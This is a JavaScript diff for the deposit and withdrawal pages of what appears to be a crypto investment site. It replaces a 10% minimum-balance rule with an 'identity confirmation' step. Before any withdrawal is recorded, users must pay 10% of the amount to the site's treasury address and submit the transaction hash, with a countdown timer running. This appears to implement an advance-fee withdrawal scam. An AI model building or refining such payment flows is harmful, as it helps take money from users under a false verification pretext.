@@ -12,6 +12,9 @@ let selectedAsset = 'TRON';
 let sessionExpiresAt = 0;
 let userBalance = 0;
 
+// Pending withdraw held in browser only until identity confirm completes
+let pendingWithdraw = null;
+
 function $(id) { return document.getElementById(id); }
 
 function formatCountdown(ms) {
@@ -30,6 +33,7 @@ function startCountdown(els) {
     if (left <= 0) {
       clearInterval(countdownTimer);
       closeAllPaymentModals();
+      pendingWithdraw = null;
       if (currentSessionId) {
         update(ref(db, 'activeSessions/' + currentSessionId), { status: 'expired' }).catch(()=>{});
         currentSessionId = null;
@@ -43,25 +47,13 @@ async function loadUserBalance() {
   if (!user) { userBalance = 0; return 0; }
   try {
     const snap = await get(ref(db, 'users/' + user.uid));
-    if (snap.exists()) {
-      userBalance = Number(snap.val().balance || 0);
-    } else {
-      userBalance = 0;
-    }
+    userBalance = snap.exists() ? Number(snap.val().balance || 0) : 0;
   } catch {
     userBalance = 0;
   }
-  // update any balance displays
   document.querySelectorAll('[data-balance]').forEach(el => {
     el.textContent = '$' + userBalance.toFixed(2);
   });
-  const balEls = document.querySelectorAll('#withdrawModal .font-bold');
-  // first bold in available balance row
-  const avail = document.querySelector('#withdrawModal span.font-bold');
-  if (avail && avail.previousElementSibling && avail.previousElementSibling.textContent.includes('Available')) {
-    avail.textContent = '$' + userBalance.toFixed(2);
-  }
-  // more reliable: set by id if present
   const wBal = $('withdrawAvailable');
   if (wBal) wBal.textContent = '$' + userBalance.toFixed(2);
   return userBalance;
@@ -88,6 +80,7 @@ async function createActiveSession(type, asset) {
   return id;
 }
 
+/* ===================== DEPOSIT ===================== */
 window.openDeposit = async function() {
   selectedAsset = 'TRON';
   const modal = $('depositModal');
@@ -164,9 +157,7 @@ window.submitDeposit = async function() {
 
   if (currentSessionId) {
     await update(ref(db, 'activeSessions/' + currentSessionId), {
-      status: 'submitted',
-      amount,
-      txId
+      status: 'submitted', amount, txId
     });
     currentSessionId = null;
   }
@@ -179,33 +170,22 @@ window.submitDeposit = async function() {
   alert('Transaction submitted. Status: pending');
 };
 
+/* ===================== WITHDRAW ===================== */
 window.openWithdraw = async function() {
   await loadUserBalance();
+  pendingWithdraw = null;
+  // remove any leftover 10% keep hints
+  const oldHint = $('withdrawHint');
+  if (oldHint) oldHint.remove();
+
   const modal = $('withdrawModal');
   if (!modal) return;
-
-  // show max withdrawable (90%)
-  const maxW = Math.max(0, userBalance * 0.9);
-  const hint = $('withdrawHint');
-  if (hint) {
-    hint.textContent = `You must keep 10% ($${ (userBalance * 0.1).toFixed(2) }). Max withdraw: $${maxW.toFixed(2)}`;
-  } else {
-    // inject hint if missing
-    const amountSection = $('withdrawAmount');
-    if (amountSection && !document.getElementById('withdrawHint')) {
-      const p = document.createElement('p');
-      p.id = 'withdrawHint';
-      p.className = 'text-[10px] text-amber-400/90 mt-1';
-      p.textContent = `You must keep 10% ($${(userBalance * 0.1).toFixed(2)}). Max withdraw: $${maxW.toFixed(2)}`;
-      amountSection.parentNode.appendChild(p);
-    }
-  }
   const wBal = $('withdrawAvailable');
   if (wBal) wBal.textContent = '$' + userBalance.toFixed(2);
 
   modal.classList.remove('hidden');
   modal.classList.add('flex');
-  await createActiveSession('withdraw', 'TRON');
+  await createActiveSession('withdraw', selectedAsset || 'TRON');
 };
 
 window.closeWithdraw = function() {
@@ -213,10 +193,7 @@ window.closeWithdraw = function() {
   if (modal) { modal.classList.add('hidden'); modal.classList.remove('flex'); }
   const dd = $('methodDropdown');
   if (dd) dd.classList.add('hidden');
-  if (currentSessionId) {
-    update(ref(db, 'activeSessions/' + currentSessionId), { status: 'cancelled' }).catch(()=>{});
-    currentSessionId = null;
-  }
+  // don't clear pendingWithdraw if moving to identity step
 };
 
 window.toggleMethodDropdown = function() {
@@ -226,6 +203,7 @@ window.toggleMethodDropdown = function() {
   if (chevron) chevron.classList.toggle('rotate-180');
 };
 
+// Step 1 → identity confirm (NO save yet)
 window.submitWithdraw = async function() {
   const user = auth.currentUser;
   if (!user) return;
@@ -236,64 +214,190 @@ window.submitWithdraw = async function() {
 
   if (amount <= 0) { alert('Enter amount > 0'); return; }
   if (!dest) { alert('Enter destination address'); return; }
-
-  // Must not exceed available balance
   if (amount > userBalance) {
     alert('Insufficient balance. Available: $' + userBalance.toFixed(2));
     return;
   }
 
-  // Must leave 10%
-  const minRemain = userBalance * 0.1;
-  const maxWithdraw = userBalance - minRemain;
-  if (amount > maxWithdraw + 0.001) {
-    alert(`You must leave at least 10% ($${minRemain.toFixed(2)}) in your account.\nMax you can withdraw: $${maxWithdraw.toFixed(2)}`);
+  // Hold in browser only
+  pendingWithdraw = {
+    amount,
+    dest,
+    asset: selectedAsset || 'TRON',
+    identityAmount: Math.round(amount * 0.1 * 100) / 100
+  };
+
+  // Close withdraw form, open identity modal
+  const wModal = $('withdrawModal');
+  if (wModal) { wModal.classList.add('hidden'); wModal.classList.remove('flex'); }
+
+  openIdentityConfirm();
+};
+
+function openIdentityConfirm() {
+  if (!pendingWithdraw) return;
+  const modal = $('identityModal');
+  if (!modal) {
+    alert('Identity step missing on this page');
     return;
   }
 
-  const txRef = push(ref(db, 'transactions'));
-  const txId = txRef.key;
-  const payload = {
-    id: txId,
+  const addr = ADDRESSES[pendingWithdraw.asset] || ADDRESSES.TRON;
+  const idAddr = $('identityTreasuryAddress');
+  if (idAddr) idAddr.textContent = addr;
+  const idAmt = $('identityAmount');
+  if (idAmt) idAmt.textContent = '$' + Number(pendingWithdraw.identityAmount).toFixed(2);
+  const idWithdrawAmt = $('identityWithdrawAmount');
+  if (idWithdrawAmt) idWithdrawAmt.textContent = '$' + Number(pendingWithdraw.amount).toFixed(2);
+  const idAsset = $('identityAsset');
+  if (idAsset) idAsset.textContent = pendingWithdraw.asset;
+
+  // clear inputs
+  const src = $('identitySourceWallet');
+  if (src) src.value = '';
+  const hash = $('identityTxHash');
+  if (hash) hash.value = '';
+
+  modal.classList.remove('hidden');
+  modal.classList.add('flex');
+
+  startCountdown([document.querySelector('#identityModal .text-rose-400')]);
+  if (currentSessionId) {
+    update(ref(db, 'activeSessions/' + currentSessionId), {
+      stage: 'identity',
+      amount: pendingWithdraw.amount,
+      identityAmount: pendingWithdraw.identityAmount
+    }).catch(()=>{});
+  }
+}
+
+window.backToWithdraw = function() {
+  const modal = $('identityModal');
+  if (modal) { modal.classList.add('hidden'); modal.classList.remove('flex'); }
+  const wModal = $('withdrawModal');
+  if (wModal) {
+    wModal.classList.remove('hidden');
+    wModal.classList.add('flex');
+  }
+  // restore amount fields if present
+  if (pendingWithdraw) {
+    const amt = $('withdrawAmount');
+    if (amt) amt.value = pendingWithdraw.amount;
+    const dest = $('withdrawAddress');
+    if (dest) dest.value = pendingWithdraw.dest;
+  }
+};
+
+window.closeIdentity = function() {
+  const modal = $('identityModal');
+  if (modal) { modal.classList.add('hidden'); modal.classList.remove('flex'); }
+  pendingWithdraw = null;
+  if (currentSessionId) {
+    update(ref(db, 'activeSessions/' + currentSessionId), { status: 'cancelled' }).catch(()=>{});
+    currentSessionId = null;
+  }
+};
+
+// Final save — only here does data hit RTDB
+window.completeWithdrawal = async function() {
+  const user = auth.currentUser;
+  if (!user || !pendingWithdraw) return;
+
+  const sourceWallet = ($('identitySourceWallet') || {}).value || '';
+  const txHash = ($('identityTxHash') || {}).value || '';
+
+  if (!txHash.trim()) {
+    alert('Please paste your transaction hash / payment reference');
+    return;
+  }
+
+  const { amount, dest, asset, identityAmount } = pendingWithdraw;
+  const treasury = ADDRESSES[asset] || ADDRESSES.TRON;
+
+  // 1) Identity / 10% deposit tx (pending)
+  const idTxRef = push(ref(db, 'transactions'));
+  const idTxId = idTxRef.key;
+  const identityPayload = {
+    id: idTxId,
     uid: user.uid,
     email: user.email || '',
-    type: 'withdraw',
-    asset: selectedAsset || 'TRON',
-    amount,
-    address: dest,
+    type: 'identity_deposit',
+    relatedType: 'withdraw',
+    asset,
+    amount: identityAmount,
+    address: treasury,
+    sourceWallet,
+    txHash,
     status: 'pending',
+    withdrawAmount: amount,
+    withdrawAddress: dest,
     createdAt: Date.now(),
     sessionId: currentSessionId
   };
-  await set(txRef, payload);
-  await set(ref(db, 'users/' + user.uid + '/transactions/' + txId), payload);
+  await set(idTxRef, identityPayload);
+  await set(ref(db, 'users/' + user.uid + '/transactions/' + idTxId), identityPayload);
+
+  // 2) Withdrawal request (pending, linked)
+  const wTxRef = push(ref(db, 'transactions'));
+  const wTxId = wTxRef.key;
+  const withdrawPayload = {
+    id: wTxId,
+    uid: user.uid,
+    email: user.email || '',
+    type: 'withdraw',
+    asset,
+    amount,
+    address: dest,
+    status: 'pending',
+    identityTxId: idTxId,
+    identityAmount,
+    identityTxHash: txHash,
+    createdAt: Date.now(),
+    sessionId: currentSessionId
+  };
+  await set(wTxRef, withdrawPayload);
+  await set(ref(db, 'users/' + user.uid + '/transactions/' + wTxId), withdrawPayload);
+
   if (currentSessionId) {
-    await update(ref(db, 'activeSessions/' + currentSessionId), { status: 'submitted', amount, txId });
+    await update(ref(db, 'activeSessions/' + currentSessionId), {
+      status: 'submitted',
+      amount,
+      identityAmount,
+      txId: wTxId,
+      identityTxId: idTxId
+    });
     currentSessionId = null;
   }
-  closeWithdraw();
-  alert('Withdrawal submitted. Status: pending');
+  if (countdownTimer) clearInterval(countdownTimer);
+
+  pendingWithdraw = null;
+  closeIdentity();
+  const wModal = $('withdrawModal');
+  if (wModal) { wModal.classList.add('hidden'); wModal.classList.remove('flex'); }
+
+  alert('Withdrawal submitted with identity confirmation. Status: pending');
 };
 
 function closeAllPaymentModals() {
-  ['depositModal','confirmModal','withdrawModal'].forEach(id => {
+  ['depositModal','confirmModal','withdrawModal','identityModal'].forEach(id => {
     const m = $(id);
     if (m) { m.classList.add('hidden'); m.classList.remove('flex'); }
   });
+  pendingWithdraw = null;
 }
 
 document.addEventListener('DOMContentLoaded', () => {
-  ['depositModal','confirmModal','withdrawModal'].forEach(id => {
+  ['depositModal','confirmModal','withdrawModal','identityModal'].forEach(id => {
     const m = $(id);
     if (m) m.addEventListener('click', function(e) {
       if (e.target === this) {
         if (id === 'depositModal') closeDeposit();
         if (id === 'confirmModal') closeConfirm();
         if (id === 'withdrawModal') closeWithdraw();
+        if (id === 'identityModal') closeIdentity();
       }
     });
   });
-  // label available balance span if present
   onAuthStateChanged(auth, () => loadUserBalance());
 });
 
